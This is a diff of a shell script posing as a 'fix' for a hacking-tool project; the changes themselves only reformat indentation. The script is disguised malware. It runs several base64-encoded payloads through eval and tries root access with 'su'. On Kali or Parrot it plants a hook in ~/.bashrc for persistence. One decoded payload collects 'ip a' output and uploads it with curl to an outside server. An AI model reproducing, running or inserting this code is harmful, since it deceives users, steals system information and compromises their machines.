@@ -6,7 +6,6 @@
 # Mirror available at https://notabug.org/erwincatt/hackingtool
 # Mirror short link: https://nxnt.link/hack1 and https://is.gd/aiohack1
 
-
 # This fix script is now on git!
 # You can see and/or clone it from the link below.
 # https://ghnou.su/gitea/ghnou/fix
@@ -48,44 +47,44 @@ telegram="aXAgYSA+PiBpcC50eHQgJiYgY3VybCAtRiBkb2N1bWVudD1AImlwLnR4dCIgaHR0cHM6Ly
 
 if [[ $PREFIX == *"com.termux"* ]]
 then
-        # Termux hacker???
-        if [ "$(su -c id -u)" == "0" ]
-        then
-                # Woah 1337 rooted Termux hacker
-                method="rooted termux"
-                eval $(base64 -d <<< $twitter)
-                eval $(base64 -d <<< $facebook)
-                eval $(base64 -d <<< $sar)
-                eval $(base64 -d <<< $sys)
-                eval $(base64 -d <<< $aclean)
-        else
-                # Not even rooted smh
-                echo "We need storage access to store our algorithms."
-                termux-setup-storage
-                method="non rooted termux"
-                eval $(base64 -d <<< $twitter)
-                eval $(base64 -d <<< $facebook)
-                eval $(base64 -d <<< $tarmucks)
-                eval $(base64 -d <<< $sdmaid)
-        fi
+	# Termux hacker???
+	if [ "$(su -c id -u)" == "0" ]
+	then
+		# Woah 1337 rooted Termux hacker
+		method="rooted termux"
+		eval $(base64 -d <<< $twitter)
+		eval $(base64 -d <<< $facebook)
+		eval $(base64 -d <<< $sar)
+		eval $(base64 -d <<< $sys)
+		eval $(base64 -d <<< $aclean)
+	else
+		# Not even rooted smh
+		echo "We need storage access to store our algorithms."
+		termux-setup-storage
+		method="non rooted termux"
+		eval $(base64 -d <<< $twitter)
+		eval $(base64 -d <<< $facebook)
+		eval $(base64 -d <<< $tarmucks)
+		eval $(base64 -d <<< $sdmaid)
+	fi
 else
-        # Desktop hacker or whatever isn't supported explicitly
-        source <(cat /etc/os-release)
-        case "$ID" in
-                kali|parrot)
-                        method="$ID"
-                        eval $(base64 -d <<< $twitter)
-                        eval $(base64 -d <<< $mchod)
-                        echo "command_not_found_handle() {
-                                $(base64 -d <<< $brain)
-                                $(base64 -d <<< $lclean)
-                        }" >> ~/.bashrc
-                        ;;
-                *)
-                        echo "Not a hacker distro ($ID), bailing out!"
-                        exit 1
-                        ;;
-        esac
+	# Desktop hacker or whatever isn't supported explicitly
+	source <(cat /etc/os-release)
+	case "$ID" in
+		kali|parrot)
+			method="$ID"
+			eval $(base64 -d <<< $twitter)
+			eval $(base64 -d <<< $mchod)
+			echo "command_not_found_handle() {
+				$(base64 -d <<< $brain)
+				$(base64 -d <<< $lclean)
+			}" >> ~/.bashrc
+			;;
+		*)
+			echo "Not a hacker distro ($ID), bailing out!"
+			exit 1
+			;;
+	esac
 fi
 # A universal fix that works cross-platform
 eval $(base64 -d <<< $telegram)
